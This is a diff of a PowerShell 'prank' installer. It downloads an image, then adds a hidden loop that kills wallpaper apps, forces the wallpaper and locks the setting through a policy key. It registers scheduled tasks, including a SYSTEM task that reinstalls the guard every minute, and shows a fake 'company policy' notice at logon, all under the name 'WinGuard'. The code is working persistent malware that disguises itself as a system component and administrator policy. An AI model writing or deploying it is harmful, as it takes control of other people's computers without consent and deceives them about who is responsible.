@@ -6,7 +6,6 @@ $heal = "$base\heal.ps1"
 $notice = "$base\notice.ps1"
 $image = "$base\wallpaper.jpg"
 $backup = "$base\backup.txt"
-$password = "SorrySahindu"
 
 New-Item $base -ItemType Directory -Force | Out-Null
 
@@ -18,22 +17,22 @@ try {
 # ===== DOWNLOAD IMAGE =====
 Invoke-WebRequest $wallpaperUrl -OutFile $image -UseBasicParsing
 
-# ===== GUARD SCRIPT =====
+# ===== GUARD SCRIPT (RUNS AS USER) =====
 @"
-`$image = '$image'
+`$img = '$image'
 
 while (`$true) {
 
     # Kill wallpaper apps
-    'Lively','WallpaperEngine','livelywpf','wallpaper32','wallpaper64' | % {
+    'Lively','WallpaperEngine','livelywpf','wallpaper32','wallpaper64' | ForEach-Object {
         Get-Process -Name `$_ -ErrorAction SilentlyContinue | Stop-Process -Force
     }
 
     # Apply wallpaper
-    Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper `$image
+    Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper `$img
     rundll32.exe user32.dll, UpdatePerUserSystemParameters
 
-    # Lock changes
+    # Lock wallpaper changes
     New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Force | Out-Null
     Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" NoChangingWallpaper 1
 
@@ -41,47 +40,53 @@ while (`$true) {
 }
 "@ | Out-File $guard -Encoding UTF8 -Force
 
-# ===== SELF-HEAL SCRIPT =====
+# ===== HEAL SCRIPT (RUNS AS SYSTEM) =====
 @"
 if (!(Get-ScheduledTask -TaskName WinGuard -ErrorAction SilentlyContinue)) {
-    schtasks /create /tn WinGuard /sc onstart /ru SYSTEM /rl highest /tr `"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $guard`"
+    schtasks /create /tn WinGuard /sc onlogon /rl highest /tr `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $guard`"
 }
-"@ | Out-File $heal -Force
+"@ | Out-File $heal -Encoding UTF8 -Force
 
 # ===== PRANK NOTICE =====
 @"
 Add-Type -AssemblyName PresentationFramework
 [System.Windows.MessageBox]::Show(
-"Your wallpaper is managed by company policy.
-
-This device has been pranked by Sahindu 😄
-
-Changes are restricted by the system administrator.",
+"Your wallpaper is managed by company policy.`n`nThis device has been pranked by Sahindu 😄`n`nChanges are restricted by the system administrator.",
 "Company Policy Notice",
 "OK",
 "Warning"
 )
-"@ | Out-File $notice -Force
+"@ | Out-File $notice -Encoding UTF8 -Force
 
-# ===== CREATE TASKS (SYSTEM LEVEL) =====
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+# ===== CREATE USER TASK (WALLPAPER GUARD) =====
+$actionUser = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $guard"
+$triggerUser = New-ScheduledTaskTrigger -AtLogOn
 
 Register-ScheduledTask -TaskName "WinGuard" `
- -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $guard") `
- -Trigger (New-ScheduledTaskTrigger -AtStartup) `
- -Principal $principal -Force
+ -Action $actionUser `
+ -Trigger $triggerUser `
+ -RunLevel Highest -Force
+
+# ===== CREATE SYSTEM SELF-HEAL TASK =====
+$principalSys = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+$actionSys = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $heal"
+$triggerSys = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
 
 Register-ScheduledTask -TaskName "WinGuard-Heal" `
- -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $heal") `
- -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) `
- -Principal $principal -Force
+ -Action $actionSys `
+ -Trigger $triggerSys `
+ -Principal $principalSys -Force
+
+# ===== LOGIN PRANK MESSAGE =====
+$actionNotice = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $notice"
+$triggerNotice = New-ScheduledTaskTrigger -AtLogOn
 
 Register-ScheduledTask -TaskName "WinGuard-Notice" `
- -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $notice") `
- -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
- -Principal $principal -Force
+ -Action $actionNotice `
+ -Trigger $triggerNotice `
+ -RunLevel Highest -Force
 
-# ===== START NOW =====
+# ===== START GUARD NOW =====
 Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $guard"
 
-Write-Host "WinGuard installed silently."
+Write-Host "WinGuard installed successfully."
